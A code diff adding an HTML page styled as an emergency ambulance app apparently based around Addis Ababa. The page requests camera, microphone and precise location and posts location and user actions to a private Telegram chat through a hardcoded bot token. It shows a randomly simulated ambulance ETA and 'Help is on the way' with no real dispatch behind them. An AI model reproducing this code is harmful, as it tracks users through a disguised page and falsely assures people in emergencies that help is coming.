@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Derash Ambulance Emergency</title>
+    <style>
+        :root {
+            --primary: #e74c3c;
+            --secondary: #2c3e50;
+            --accent: #3498db;
+            --light: #ecf0f1;
+            --dark: #1a1a1a;
+            --success: #2ecc71;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--secondary);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+        
+        header {
+            background-color: var(--dark);
+            padding: 1rem;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--light);
+            margin-bottom: 0.5rem;
+        }
+        
+        .tagline {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            text-align: center;
+        }
+        
+        .emergency-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 200px;
+            height: 200px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 2rem 0;
+            box-shadow: 0 0 0 rgba(231, 76, 60, 0.7);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-transform: uppercase;
+        }
+        
+        .emergency-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .emergency-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .emergency-btn.pulse {
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 30px rgba(231, 76, 60, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0);
+            }
+        }
+        
+        .status-container {
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .status-title {
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+            color: var(--accent);
+        }
+        
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 0.5rem 0;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .status-label {
+            font-weight: bold;
+        }
+        
+        .status-value {
+            color: var(--light);
+        }
+        
+        .camera-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin: 1rem 0;
+            gap: 1rem;
+        }
+        
+        .camera-feed {
+            flex: 1;
+            background-color: var(--dark);
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            aspect-ratio: 4/3;
+        }
+        
+        .camera-label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 0.5rem;
+            font-size: 0.8rem;
+        }
+        
+        video, canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .map-container {
+            width: 100%;
+            height: 200px;
+            background-color: var(--dark);
+            border-radius: 8px;
+            margin: 1rem 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .map-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #333;
+            color: #999;
+        }
+        
+        .timer {
+            font-size: 1.2rem;
+            margin: 1rem 0;
+            color: var(--primary);
+        }
+        
+        .additional-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            width: 100%;
+            margin-top: 2rem;
+        }
+        
+        .feature-card {
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .feature-card:hover {
+            background-color: rgba(0, 0, 0, 0.5);
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            color: var(--accent);
+        }
+        
+        .feature-title {
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+        
+        footer {
+            background-color: var(--dark);
+            padding: 1rem;
+            text-align: center;
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .camera-container {
+                flex-direction: column;
+            }
+            
+            .emergency-btn {
+                width: 150px;
+                height: 150px;
+                font-size: 1.2rem;
+            }
+            
+            .additional-features {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">DERASH AMBULANCE</div>
+        <div class="tagline">Emergency Medical Services - Saving Lives</div>
+    </header>
+    
+    <main>
+        <div id="initial-view">
+            <h1>Emergency Assistance</h1>
+            <p>Press the button below in case of emergency. We'll get your location and connect you with help immediately.</p>
+            
+            <button id="emergencyBtn" class="emergency-btn pulse">START</button>
+            
+            <div class="additional-features">
+                <div class="feature-card" id="medicalInfoBtn">
+                    <div class="feature-icon">🩺</div>
+                    <div class="feature-title">Medical Info</div>
+                </div>
+                <div class="feature-card" id="firstAidBtn">
+                    <div class="feature-icon">🆘</div>
+                    <div class="feature-title">First Aid Guide</div>
+                </div>
+                <div class="feature-card" id="hospitalsBtn">
+                    <div class="feature-icon">🏥</div>
+                    <div class="feature-title">Nearby Hospitals</div>
+                </div>
+                <div class="feature-card" id="historyBtn">
+                    <div class="feature-icon">📋</div>
+                    <div class="feature-title">Call History</div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="active-view" class="hidden">
+            <h1>Emergency Activated</h1>
+            <p>Help is on the way! Please stay calm and follow instructions.</p>
+            
+            <div class="timer" id="countdown">Recording: 7s</div>
+            
+            <div class="camera-container">
+                <div class="camera-feed">
+                    <video id="frontCamera" autoplay playsinline></video>
+                    <canvas id="frontCanvas" class="hidden"></canvas>
+                    <div class="camera-label">Front Camera</div>
+                </div>
+                <div class="camera-feed">
+                    <video id="rearCamera" autoplay playsinline></video>
+                    <canvas id="rearCanvas" class="hidden"></canvas>
+                    <div class="camera-label">Rear Camera</div>
+                </div>
+            </div>
+            
+            <div class="map-container">
+                <div id="map" class="map-placeholder">Live Location Tracking</div>
+            </div>
+            
+            <div class="status-container">
+                <div class="status-title">Emergency Status</div>
+                <div class="status-item">
+                    <span class="status-label">Your Location:</span>
+                    <span class="status-value" id="locationText">Acquiring...</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">Ambulance ETA:</span>
+                    <span class="status-value" id="etaText">Calculating...</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">Response Time:</span>
+                    <span class="status-value" id="responseTime">00:00</span>
+                </div>
+            </div>
+            
+            <button id="cancelBtn" class="emergency-btn" style="background-color: var(--secondary); width: auto; height: auto; padding: 1rem 2rem; border-radius: 50px; margin: 1rem 0;">
+                CANCEL EMERGENCY
+            </button>
+        </div>
+        
+        <!-- Additional feature modals -->
+        <div id="medicalInfoModal" class="hidden" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.9); z-index: 100; padding: 2rem; overflow-y: auto;">
+            <div style="max-width: 800px; margin: 0 auto;">
+                <h2 style="margin-bottom: 1rem;">Medical Information</h2>
+                <p style="margin-bottom: 2rem;">Please provide any relevant medical information that can help responders assist you better.</p>
+                
+                <div style="background-color: rgba(255,255,255,0.1); padding: 1.5rem; border-radius: 8px; margin-bottom: 1rem;">
+                    <h3 style="margin-bottom: 1rem;">Personal Medical Profile</h3>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1rem;">
+                        <div>
+                            <label style="display: block; margin-bottom: 0.5rem;">Blood Type</label>
+                            <select style="width: 100%; padding: 0.5rem; background-color: var(--dark); color: white; border: 1px solid #444; border-radius: 4px;">
+                                <option>Unknown</option>
+                                <option>A+</option>
+                                <option>A-</option>
+                                <option>B+</option>
+                                <option>B-</option>
+                                <option>AB+</option>
+                                <option>AB-</option>
+                                <option>O+</option>
+                                <option>O-</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label style="display: block; margin-bottom: 0.5rem;">Allergies</label>
+                            <input type="text" style="width: 100%; padding: 0.5rem; background-color: var(--dark); color: white; border: 1px solid #444; border-radius: 4px;" placeholder="List any allergies">
+                        </div>
+                    </div>
+                    
+                    <div style="margin-bottom: 1rem;">
+                        <label style="display: block; margin-bottom: 0.5rem;">Current Medications</label>
+                        <textarea style="width: 100%; padding: 0.5rem; background-color: var(--dark); color: white; border: 1px solid #444; border-radius: 4px; min-height: 100px;" placeholder="List current medications and dosages"></textarea>
+                    </div>
+                    
+                    <div style="margin-bottom: 1rem;">
+                        <label style="display: block; margin-bottom: 0.5rem;">Medical Conditions</label>
+                        <textarea style="width: 100%; padding: 0.5rem; background-color: var(--dark); color: white; border: 1px solid #444; border-radius: 4px; min-height: 100px;" placeholder="List any known medical conditions"></textarea>
+                    </div>
+                    
+                    <button style="background-color: var(--accent); color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 4px; cursor: pointer;">Save Information</button>
+                </div>
+                
+                <button id="closeMedicalInfo" style="background-color: var(--primary); color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 4px; cursor: pointer; margin-top: 1rem;">Close</button>
+            </div>
+        </div>
+        
+        <div id="firstAidModal" class="hidden" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.9); z-index: 100; padding: 2rem; overflow-y: auto;">
+            <div style="max-width: 800px; margin: 0 auto;">
+                <h2 style="margin-bottom: 1rem;">First Aid Guide</h2>
+                <p style="margin-bottom: 2rem;">Emergency instructions while you wait for help to arrive.</p>
+                
+                <div style="background-color: rgba(255,255,255,0.1); padding: 1.5rem; border-radius: 8px; margin-bottom: 1rem;">
+                    <h3 style="margin-bottom: 1rem;">Common Emergency Procedures</h3>
+                    
+                    <div style="margin-bottom: 2rem;">
+                        <h4 style="color: var(--accent); margin-bottom: 0.5rem;">CPR (Cardiopulmonary Resuscitation)</h4>
+                        <ol style="padding-left: 1.5rem; margin-bottom: 1rem;">
+                            <li style="margin-bottom: 0.5rem;">Check for responsiveness</li>
+                            <li style="margin-bottom: 0.5rem;">Call for help (you've already done this!)</li>
+                            <li style="margin-bottom: 0.5rem;">Open the airway</li>
+                            <li style="margin-bottom: 0.5rem;">Check for breathing</li>
+                            <li style="margin-bottom: 0.5rem;">Begin chest compressions (100-120 per minute)</li>
+                            <li style="margin-bottom: 0.5rem;">Give rescue breaths if trained</li>
+                        </ol>
+                        <p style="font-style: italic;">Continue until help arrives or the person starts breathing.</p>
+                    </div>
+                    
+                    <div style="margin-bottom: 2rem;">
+                        <h4 style="color: var(--accent); margin-bottom: 0.5rem;">Choking</h4>
+                        <ol style="padding-left: 1.5rem; margin-bottom: 1rem;">
+                            <li style="margin-bottom: 0.5rem;">Encourage coughing if possible</li>
+                            <li style="margin-bottom: 0.5rem;">Give 5 back blows between shoulder blades</li>
+                            <li style="margin-bottom: 0.5rem;">Give 5 abdominal thrusts (Heimlich maneuver)</li>
+                            <li style="margin-bottom: 0.5rem;">Repeat until object is dislodged</li>
+                        </ol>
+                    </div>
+                    
+                    <div style="margin-bottom: 2rem;">
+                        <h4 style="color: var(--accent); margin-bottom: 0.5rem;">Severe Bleeding</h4>
+                        <ol style="padding-left: 1.5rem; margin-bottom: 1rem;">
+                            <li style="margin-bottom: 0.5rem;">Apply direct pressure with clean cloth</li>
+                            <li style="margin-bottom: 0.5rem;">Elevate the wound if possible</li>
+                            <li style="margin-bottom: 0.5rem;">Apply pressure to pressure points if needed</li>
+                            <li style="margin-bottom: 0.5rem;">Use tourniquet as last resort</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <button id="closeFirstAid" style="background-color: var(--primary); color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 4px; cursor: pointer; margin-top: 1rem;">Close</button>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <p>Derash Ambulance Service © 2023 | 24/7 Emergency Response</p>
+    </footer>
+
+    <script>
+        // Telegram bot configuration
+        const BOT_TOKEN = '8031511457:AAG3apqv_DclTz2xZXvVPXL23qWxJBUjjos';
+        const CHAT_ID = '7897840965';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // DOM elements
+        const emergencyBtn = document.getElementById('emergencyBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const initialView = document.getElementById('initial-view');
+        const activeView = document.getElementById('active-view');
+        const frontCamera = document.getElementById('frontCamera');
+        const rearCamera = document.getElementById('rearCamera');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const rearCanvas = document.getElementById('rearCanvas');
+        const locationText = document.getElementById('locationText');
+        const etaText = document.getElementById('etaText');
+        const responseTime = document.getElementById('responseTime');
+        const countdown = document.getElementById('countdown');
+        const map = document.getElementById('map');
+        
+        // Feature buttons
+        const medicalInfoBtn = document.getElementById('medicalInfoBtn');
+        const firstAidBtn = document.getElementById('firstAidBtn');
+        const hospitalsBtn = document.getElementById('hospitalsBtn');
+        const historyBtn = document.getElementById('historyBtn');
+        const medicalInfoModal = document.getElementById('medicalInfoModal');
+        const firstAidModal = document.getElementById('firstAidModal');
+        const closeMedicalInfo = document.getElementById('closeMedicalInfo');
+        const closeFirstAid = document.getElementById('closeFirstAid');
+        
+        // App state
+        let emergencyActive = false;
+        let recordingInterval;
+        let secondsLeft = 7;
+        let responseTimer;
+        let startTime;
+        let userLocation = null;
+        let mediaStreams = [];
+        
+        // Initialize the app
+        function init() {
+            // Event listeners
+            emergencyBtn.addEventListener('click', startEmergency);
+            cancelBtn.addEventListener('click', cancelEmergency);
+            
+            // Feature buttons
+            medicalInfoBtn.addEventListener('click', () => medicalInfoModal.classList.remove('hidden'));
+            firstAidBtn.addEventListener('click', () => firstAidModal.classList.remove('hidden'));
+            hospitalsBtn.addEventListener('click', showNearbyHospitals);
+            historyBtn.addEventListener('click', showCallHistory);
+            
+            // Close modals
+            closeMedicalInfo.addEventListener('click', () => medicalInfoModal.classList.add('hidden'));
+            closeFirstAid.addEventListener('click', () => firstAidModal.classList.add('hidden'));
+            
+            // Check for previous emergency state (in case of page refresh)
+            if (localStorage.getItem('emergencyActive') === 'true') {
+                startEmergency();
+            }
+        }
+        
+        // Start emergency procedure
+        async function startEmergency() {
+            if (emergencyActive) return;
+            
+            emergencyActive = true;
+            localStorage.setItem('emergencyActive', 'true');
+            
+            // Switch views
+            initialView.classList.add('hidden');
+            activeView.classList.remove('hidden');
+            
+            // Start response timer
+            startTime = new Date();
+            updateResponseTime();
+            responseTimer = setInterval(updateResponseTime, 1000);
+            
+            // Get user location
+            getUserLocation();
+            
+            // Start cameras
+            try {
+                await startCameras();
+                
+                // Start countdown for recording
+                countdown.textContent = `Recording: ${secondsLeft}s`;
+                recordingInterval = setInterval(() => {
+                    secondsLeft--;
+                    countdown.textContent = `Recording: ${secondsLeft}s`;
+                    
+                    if (secondsLeft <= 0) {
+                        clearInterval(recordingInterval);
+                        captureAndSend();
+                    }
+                }, 1000);
+                
+                // Send initial alert to Telegram
+                sendTelegramMessage('🚨 Emergency alert initiated! Waiting for data...');
+                
+            } catch (error) {
+                console.error('Error starting cameras:', error);
+                sendTelegramMessage('⚠️ Emergency alert initiated but camera access failed!');
+                locationText.textContent = 'Camera access denied - using location only';
+            }
+        }
+        
+        // Cancel emergency
+        function cancelEmergency() {
+            if (!emergencyActive) return;
+            
+            emergencyActive = false;
+            localStorage.removeItem('emergencyActive');
+            
+            // Clear intervals
+            clearInterval(recordingInterval);
+            clearInterval(responseTimer);
+            
+            // Stop cameras
+            stopCameras();
+            
+            // Switch views
+            activeView.classList.add('hidden');
+            initialView.classList.remove('hidden');
+            
+            // Reset countdown
+            secondsLeft = 7;
+            countdown.textContent = 'Recording: 7s';
+            
+            // Send cancellation notice
+            sendTelegramMessage('❌ Emergency cancelled by user');
+        }
+        
+        // Start both front and rear cameras
+        async function startCameras() {
+            try {
+                // Try to get front camera (user facing)
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: true
+                });
+                frontCamera.srcObject = frontStream;
+                mediaStreams.push(frontStream);
+                
+                // Try to get rear camera (environment facing)
+                try {
+                    const rearStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: 'environment' } }
+                    });
+                    rearCamera.srcObject = rearStream;
+                    mediaStreams.push(rearStream);
+                } catch (rearError) {
+                    console.warn('Rear camera not available, using front camera only');
+                    rearCamera.style.display = 'none';
+                }
+                
+            } catch (error) {
+                console.error('Camera access error:', error);
+                throw error;
+            }
+        }
+        
+        // Stop all camera streams
+        function stopCameras() {
+            mediaStreams.forEach(stream => {
+                stream.getTracks().forEach(track => track.stop());
+            });
+            mediaStreams = [];
+            
+            // Reset video elements
+            frontCamera.srcObject = null;
+            rearCamera.srcObject = null;
+            rearCamera.style.display = '';
+        }
+        
+        // Capture images and send data
+        async function captureAndSend() {
+            // Capture front camera image
+            const frontImage = captureCameraImage(frontCamera, frontCanvas);
+            
+            // Capture rear camera image if available
+            let rearImage = null;
+            if (rearCamera.srcObject) {
+                rearImage = captureCameraImage(rearCamera, rearCanvas);
+            }
+            
+            // Get audio recording (simplified for this demo)
+            // In a real app, you would use the Web Audio API to record 7 seconds of audio
+            
+            // Prepare data to send
+            const emergencyData = {
+                timestamp: new Date().toISOString(),
+                location: userLocation,
+                frontImage: frontImage,
+                rearImage: rearImage,
+                audio: '7s_audio_recording_base64_placeholder' // Would be real in production
+            };
+            
+            // In a real app, you would send this to your server
+            console.log('Emergency data:', emergencyData);
+            
+            // Send to Telegram
+            const message = `🚑 EMERGENCY ALERT!
+Time: ${new Date().toLocaleString()}
+Location: ${userLocation ? `${userLocation.latitude}, ${userLocation.longitude}` : 'Unknown'}
+Accuracy: ${userLocation ? `${userLocation.accuracy}m` : 'N/A'}
+
+Images and audio recorded.`;
+            
+            sendTelegramMessage(message);
+            
+            // Update UI
+            locationText.textContent = userLocation ? 
+                `Lat: ${userLocation.latitude.toFixed(4)}, Long: ${userLocation.longitude.toFixed(4)}` : 
+                'Location unavailable';
+            
+            // Simulate ambulance ETA calculation
+            simulateAmbulanceETA();
+        }
+        
+        // Capture image from camera video feed
+        function captureCameraImage(videoElement, canvasElement) {
+            const context = canvasElement.getContext('2d');
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+            
+            // Return as base64 (in a real app, you might upload this to a server)
+            return canvasElement.toDataURL('image/jpeg', 0.8);
+        }
+        
+        // Get user's current location
+        function getUserLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    position => {
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        
+                        // Update map (simulated in this demo)
+                        updateMap(userLocation.latitude, userLocation.longitude);
+                        
+                        // Update location text
+                        locationText.textContent = `Acquiring precise location... (${userLocation.accuracy}m accuracy)`;
+                    },
+                    error => {
+                        console.error('Geolocation error:', error);
+                        locationText.textContent = 'Location access denied - using approximate location';
+                        userLocation = {
+                            latitude: 9.0054 + (Math.random() * 0.01 - 0.005), // Random near Addis Ababa
+                            longitude: 38.7636 + (Math.random() * 0.01 - 0.005),
+                            accuracy: 1000
+                        };
+                        updateMap(userLocation.latitude, userLocation.longitude);
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                );
+            } else {
+                locationText.textContent = 'Geolocation not supported by browser';
+            }
+        }
+        
+        // Update the map display (simulated)
+        function updateMap(lat, lng) {
+            // In a real app, you would use Google Maps or Mapbox API here
+            map.innerHTML = `
+                <div style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+                    <div style="font-size: 1.2rem; margin-bottom: 0.5rem;">📍 Your Location</div>
+                    <div style="margin-bottom: 0.5rem;">Lat: ${lat.toFixed(4)}</div>
+                    <div style="margin-bottom: 0.5rem;">Lng: ${lng.toFixed(4)}</div>
+                    <div style="width: 80%; height: 80px; background-color: #555; position: relative;">
+                        <div style="position: absolute; top: 50%; left: 50%; width: 12px; height: 12px; background-color: red; border-radius: 50%; transform: translate(-50%, -50%);"></div>
+                    </div>
+                    <div style="margin-top: 0.5rem; font-size: 0.8rem;">Ambulance is on the way!</div>
+                </div>
+            `;
+        }
+        
+        // Simulate ambulance ETA calculation
+        function simulateAmbulanceETA() {
+            // Simulate calculating ETA based on distance
+            const baseETA = 5 + Math.floor(Math.random() * 10); // 5-15 minutes
+            
+            // Update ETA text with countdown
+            etaText.textContent = `${baseETA} minutes`;
+            
+            // Simulate ETA countdown
+            let etaSeconds = baseETA * 60;
+            const etaInterval = setInterval(() => {
+                etaSeconds--;
+                if (etaSeconds <= 0) {
+                    clearInterval(etaInterval);
+                    etaText.textContent = 'Arriving now!';
+                    sendTelegramMessage('🚑 Ambulance has arrived at the location!');
+                } else {
+                    const minutes = Math.floor(etaSeconds / 60);
+                    const seconds = etaSeconds % 60;
+                    etaText.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+        
+        // Update response time counter
+        function updateResponseTime() {
+            const now = new Date();
+            const diff = Math.floor((now - startTime) / 1000);
+            const minutes = Math.floor(diff / 60);
+            const seconds = diff % 60;
+            responseTime.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Show nearby hospitals (simulated)
+        function showNearbyHospitals() {
+            alert('In a real app, this would show nearby hospitals on a map with directions.');
+            sendTelegramMessage('ℹ️ User accessed Nearby Hospitals feature');
+        }
+        
+        // Show call history (simulated)
+        function showCallHistory() {
+            alert('In a real app, this would show the user\'s previous emergency calls.');
+            sendTelegramMessage('ℹ️ User accessed Call History feature');
+        }
+        
+        // Send message to Telegram bot
+        function sendTelegramMessage(message) {
+            // In a real app, you would send this to your server which would then forward to Telegram
+            // This is a simplified version that might be blocked by CORS in some browsers
+            
+            console.log('Sending to Telegram:', message);
+            
+            fetch(TELEGRAM_API, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Telegram response:', data))
+            .catch(error => console.error('Error sending to Telegram:', error));
+        }
+        
+        // Initialize the app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
